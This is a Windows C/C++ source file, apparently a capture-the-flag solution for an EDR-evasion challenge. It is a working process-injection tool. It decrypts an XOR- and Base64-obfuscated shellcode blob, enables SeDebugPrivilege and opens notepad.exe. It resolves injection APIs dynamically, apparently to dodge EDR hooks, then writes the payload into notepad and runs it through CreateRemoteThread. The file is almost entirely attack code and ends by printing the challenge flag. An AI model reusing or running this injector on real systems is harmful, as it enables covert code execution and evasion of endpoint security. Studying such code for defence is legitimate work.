#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>

#include <Wincrypt.h>
#pragma comment(lib, "crypt32.lib")
#include <winuser.h>

// =======================================================================
// =======================================================================

char* Base64DecString(const char* base64String) {
	// Convert the Base64 string to a BYTE array
	DWORD dataSize = 0;
	CryptStringToBinaryA(base64String, 0, CRYPT_STRING_BASE64, NULL, &dataSize, NULL, NULL);

	// Allocate memory for the decoded data
	BYTE* decodedData = (BYTE*)malloc(dataSize);
	if (!decodedData) {
		return NULL;  // Memory allocation failed
	}

	CryptStringToBinaryA(base64String, 0, CRYPT_STRING_BASE64, decodedData, &dataSize, NULL, NULL);

	// Null-terminate the decoded data
	decodedData[dataSize] = '\0';

	// Return the dynamically allocated string
	return reinterpret_cast<char*>(decodedData);
}


typedef BOOL(WINAPI* pVirtualProtect)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flNewProtect,
	PDWORD lpflOldProtect
	);

typedef HANDLE(WINAPI* pCreateRemoteThread)(
	HANDLE                 hProcess,
	LPSECURITY_ATTRIBUTES  lpThreadAttributes,
	SIZE_T                 dwStackSize,
	LPTHREAD_START_ROUTINE lpStartAddress,
	LPVOID                 lpParameter,
	DWORD                  dwCreationFlags,
	LPDWORD                lpThreadId
	);

typedef LPVOID(WINAPI* pVirtualAllocEx)(
	HANDLE hProcess,
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
	);




#define InitializeObjectAttributes(p,n,a,r,s) { \
  (p)->Length = sizeof(OBJECT_ATTRIBUTES); \
  (p)->RootDirectory = (r); \
  (p)->Attributes = (a); \
  (p)->ObjectName = (n); \
  (p)->SecurityDescriptor = (s); \
  (p)->SecurityQualityOfService = NULL; \
}

// dt nt!_UNICODE_STRING
typedef struct _LSA_UNICODE_STRING {
	USHORT            Length;
	USHORT            MaximumLength;
	PWSTR             Buffer;
} UNICODE_STRING, * PUNICODE_STRING;


// dt nt!_OBJECT_ATTRIBUTES
typedef struct _OBJECT_ATTRIBUTES {
	ULONG            Length;
	HANDLE           RootDirectory;
	PUNICODE_STRING  ObjectName;
	ULONG            Attributes;
	PVOID            SecurityDescriptor;
	PVOID            SecurityQualityOfService;
} OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

// dt nt!_CLIENT_ID
typedef struct _CLIENT_ID {
	PVOID            UniqueProcess;
	PVOID            UniqueThread;
} CLIENT_ID, * PCLIENT_ID;


typedef NTSTATUS(WINAPI* pNtOpenProcess)(
	PHANDLE            ProcessHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes,
	PCLIENT_ID         ClientId
	);

typedef BOOL(WINAPI* pWriteProcessMemory)(
	HANDLE  hProcess,
	LPVOID  lpBaseAddress,
	LPCVOID lpBuffer,
	SIZE_T  nSize,
	SIZE_T* lpNumberOfBytesWritten
	);

typedef VOID(WINAPI* pRtlMoveMemory)(
	VOID UNALIGNED* Destination,
	const VOID UNALIGNED* Source,
	SIZE_T Length
	);


// ====================================
// ====================================


int get_process_id_from_szexefile(wchar_t processName[]) {
	PROCESSENTRY32 entry = { 0 };
	entry.dwSize = sizeof(PROCESSENTRY32);
	HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
	if (Process32First(snapshot, &entry) == TRUE) {
		while (Process32Next(snapshot, &entry) == TRUE) {
			if (wcscmp(entry.szExeFile, processName) == 0) {
				return entry.th32ProcessID;
			}
		}
	}
	else {
		printf("CreateToolhelper32Snapshot failed : %d\n", GetLastError());
		exit(1);
	}
	printf("Process not found.\n");
	exit(1);
}


void check_if_se_debug_privilege_is_enabled() {
	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, GetCurrentProcessId());
	HANDLE hToken;
	OpenProcessToken(hProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken);
	DWORD cbSize;
	GetTokenInformation(hToken, TokenIntegrityLevel, NULL, 0, &cbSize);
	PTOKEN_MANDATORY_LABEL pTIL = (PTOKEN_MANDATORY_LABEL)LocalAlloc(0, cbSize);
	GetTokenInformation(hToken, TokenIntegrityLevel, pTIL, cbSize, &cbSize);
	DWORD current_process_integrity = (DWORD)*GetSidSubAuthority(pTIL->Label.Sid, (DWORD)(UCHAR)(*GetSidSubAuthorityCount(pTIL->Label.Sid) - 1));

	TOKEN_PRIVILEGES tp;

	LUID luidSeDebugPrivilege;
	if (LookupPrivilegeValue(NULL, SE_DEBUG_NAME, &luidSeDebugPrivilege) == 0) {
		printf("%s not owned\n", Base64DecString("U2VEZWJ1Z1ByaXZpbGVnZQ=="));
	}
	else {
		printf("%s owned\n", Base64DecString("U2VEZWJ1Z1ByaXZpbGVnZQ=="));
	}
	tp.PrivilegeCount = 1;
	tp.Privileges[0].Luid = luidSeDebugPrivilege;
	tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
	if (AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL) == 0) {
		printf("%s adjust token failed: %d\n", Base64DecString("U2VEZWJ1Z1ByaXZpbGVnZQ=="), GetLastError());
	}
	else {
		printf("%s enabled.\n", Base64DecString("U2VEZWJ1Z1ByaXZpbGVnZQ=="));
	}

	CloseHandle(hProcess);
	CloseHandle(hToken);
}



int Base64Dec(const BYTE* src, IN unsigned int srcLen, OUT char* dst, IN unsigned int dstLen)
{
	DWORD outLen;
	BOOL fRet;


	outLen = dstLen;
	fRet = CryptStringToBinaryA((LPCSTR)src, srcLen, CRYPT_STRING_BASE64, (BYTE*)dst, &outLen, NULL, NULL);

	if (!fRet) outLen = 0; // failed

	return (outLen);
}

void XOR(char* data, size_t data_len, char* key, size_t key_len) {
	int j;

	j = 0;
	for (int i = 0; i < data_len; i++) {
		if (j == key_len - 1) j = 0;

		data[i] = data[i] ^ key[j];
		j++;
	}
}




int main() {
	printf("Launching remote shellcode injection\n");

	// Base64 -> XOR
	unsigned char shellcode[] = { 0x42, 0x24, 0x1a, 0x21, 0x56, 0x22, 0x21, 0x1b, 0x1c, 0x24, 0x38, 0x2c, 0x20, 0x36, 0x23, 0x31, 0x23, 0x33, 0x36, 0x38, 0x30, 0x2f, 0x37, 0x28, 0x3e, 0x1, 0x29, 0x1e, 0x36, 0x3d, 0x1f, 0x36, 0x20, 0x28, 0x8, 0x3f, 0x30, 0xb, 0x1a, 0x2c, 0x1d, 0x5a, 0x2c, 0x1e, 0x3e, 0x28, 0x7, 0x1c, 0x36, 0x37, 0x2, 0x24,
	0x1f, 0x55, 0x9, 0x26, 0x35, 0x27, 0x2d, 0x29, 0x21, 0x21, 0x3c, 0x2a, 0x17, 0x3d, 0x15, 0x9, 0x15, 0x24, 0x2a, 0x1, 0x2c, 0x31, 0x23, 0x27, 0x0, 0x3c, 0x50, 0x31, 0x24, 0x0, 0x3a, 0xc, 0x43, 0x3d, 0x2f, 0x3b, 0x38, 0x34, 0x1a, 0x29, 0x36, 0x1b, 0x26, 0x38, 0x3a, 0xf, 0x1, 0x24, 0x20, 0x17, 0x26, 0x2f, 0x15, 0x2c, 0x13, 0x2a, 0x24, 0x38, 0x2f, 0x28, 0x1b, 0x6, 0x21, 0x42, 0x3f, 0x44, 0xc, 0x27, 0x49, 0x2b, 0x22, 0x3f, 0x36, 0x21, 0x1a, 0x20, 0x1d, 0x5b, 0x24, 0x1e, 0x3e, 0x30, 0x3b, 0x34, 0x57, 0x43, 0x3f, 0x3d, 0x44, 0x5d, 0x15, 0x2f, 0x8, 0x9, 0x36, 0x2a, 0x21, 0x24, 0x3c, 0x3c, 0x31, 0x2d, 0x25, 0x2b, 0x20,
	0x21, 0x2b, 0x33, 0x17, 0x31, 0x23, 0x27, 0x0, 0x3c, 0x50, 0x31, 0x24, 0x0, 0x37, 0x51, 0x40, 0x23, 0x3d, 0x1, 0x39, 0x20, 0x3d, 0x28, 0x29, 0x33, 0xd, 0x32, 0x24, 0x1, 0x3f, 0x5c, 0x53, 0x35, 0xd, 0x26, 0x1b, 0x55, 0x35, 0x0, 0x36, 0x28, 0x25, 0x30, 0x29, 0xe, 0x24, 0x3e, 0x21, 0x31, 0x3, 0x20, 0x10, 0x5d,
	0x20, 0x10, 0x36, 0x32, 0x3a, 0x34, 0x25, 0x32, 0x16, 0x3c, 0x4, 0x24, 0x14, 0x27, 0x53, 0x37, 0x23, 0x2d, 0x3a, 0x33, 0x11, 0x8, 0x36, 0x25, 0x15, 0x21, 0x25, 0x20, 0x32, 0x31, 0x34, 0x2f, 0x1d, 0x28, 0x14, 0x4e, 0x14, 0x15, 0x34, 0x22, 0x27, 0x4a, 0x4d, 0x2b, 0x9, 0x31, 0x32, 0x35, 0x2, 0x2c, 0x1d, 0x13, 0x29, 0x9, 0x3b, 0x4e, 0x5c, 0x4a, 0x4c, 0x43, 0x54, 0x3d, 0x1e, 0x2, 0x3c, 0x2c, 0x20, 0x32, 0x24, 0x22, 0x33, 0x24, 0x35, 0x2a, 0x36, 0x30, 0x5f, 0x2f, 0x32, 0x34, 0x26, 0x33, 0x24, 0x31, 0x2c, 0x53, 0x34, 0x34, 0x15, 0x5, 0xd, 0x4c, 0x5d, 0x33, 0x1, 0x44, 0x26, 0x48, 0x2, 0xd, 0x29, 0x27, 0x16, 0x3, 0x4, 0x22, 0x1d, 0x3f, 0x4a, 0x42, 0x50, 0x26, 0xc, 0x27, 0xa, 0x26, 0x13, 0x53, 0x27, 0x17, 0x1a, 0x2a, 0x14, 0x35, 0x15, 0x15, 0x1, 0x25, 0x3c, 0x52, 0x2b, 0x15, 0x2f, 0xa, 0x7, 0x51, 0x1d, 0x24, 0x23, 0x3e, 0x22, 0x33, 0x5f, 0x17, 0x5c, 0x33, 0x3a, 0x40, 0x23, 0x7, 0x32, 0x1c, 0x4c, 0x1, 0x4, 0x34, 0x30, 0x22 };

	char key[] = "masecretkey";
	unsigned int shellcode_len = sizeof(shellcode);
	// ====================================



	// DO NOT REMOVE
	// When loading a DLL remotely, its content won't apply until all DLL's are loaded
	// For some reason it leads to a race condition which is not part of the challenge
	// Hence do not remove the Sleep (even if it'd allow you bypassing the hooks)
	Sleep(5000);
	// DO NOT REMOVE
	check_if_se_debug_privilege_is_enabled();

	
	// ===========================================

	
	DWORD processId; 
	wchar_t processName[] = L"notepad.exe";
	processId = get_process_id_from_szexefile(processName);
	printf("Injecting to PID: %i\n", processId);


	OBJECT_ATTRIBUTES oa;
	CLIENT_ID cid;

	InitializeObjectAttributes(&oa, NULL, 0, NULL, NULL);
	cid.UniqueProcess = (PVOID)processId;
	cid.UniqueThread = 0;

	BOOL rv;
	DWORD oldprotect = 0;

	pVirtualAllocEx VirtualAllocEx_f = reinterpret_cast<pVirtualAllocEx>(
		GetProcAddress(GetModuleHandle(L"kernel32.dll"), "VirtualAllocEx"));

	pCreateRemoteThread CreateRemoteThread_f = reinterpret_cast<pCreateRemoteThread>(
		GetProcAddress(GetModuleHandle(L"kernel32.dll"), "CreateRemoteThread"));

	pWriteProcessMemory WriteProcessMemory_f = reinterpret_cast<pWriteProcessMemory>(
		GetProcAddress(GetModuleHandle(L"kernel32.dll"), "WriteProcessMemory"));

	pNtOpenProcess NtOpenProcess_f = reinterpret_cast<pNtOpenProcess>(
		GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtOpenProcess"));

	pVirtualProtect VirtualProtect_f = reinterpret_cast<pVirtualProtect>(
		GetProcAddress(GetModuleHandle(L"kernel32.dll"), "VirtualProtect"));

	pRtlMoveMemory RtlMoveMemory_f = reinterpret_cast<pRtlMoveMemory>(
		GetProcAddress(GetModuleHandle(L"NTDLL.DLL"), "RtlMoveMemory"));
	
	
	HANDLE processHandle = NULL;
	NtOpenProcess_f(&processHandle, PROCESS_ALL_ACCESS, &oa, &cid);
	printf("VirtualAllocEx\n");

	if (processHandle == NULL) return -1;


	// Decrypt and copy payload into loaded library
	// ==== [Decrypt (DeXOR) the payload] ====
	XOR((char*)shellcode, shellcode_len, key, sizeof(key));
	// ==== [Decode base64] ====
	int fRet = Base64Dec((const BYTE*)shellcode, shellcode_len, (char*)shellcode, shellcode_len);

	PVOID remoteBuffer = VirtualAllocEx_f(processHandle, NULL, shellcode_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

	printf("WriteProcessMemory\n");
	WriteProcessMemory_f(processHandle, remoteBuffer, shellcode, shellcode_len, NULL);

	printf("CreateRemoteThread\n");
	rv = VirtualProtect_f(shellcode, shellcode_len, PAGE_EXECUTE_READWRITE, &oldprotect);
	HANDLE remoteThread = CreateRemoteThread_f(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)remoteBuffer, NULL, 0, NULL);
	
	// If all good, we launch the payload
	if(rv != 0) {
		WaitForSingleObject(processHandle, -1);
		CloseHandle(remoteThread);
	}

	printf("Congratz dude! The flag is MyDumbEDR{H4ckTH3W0rld}\n");
	printf("Expect more checks in the upcoming weeks ;)\n");
	CloseHandle(processHandle);
	return 0;
}
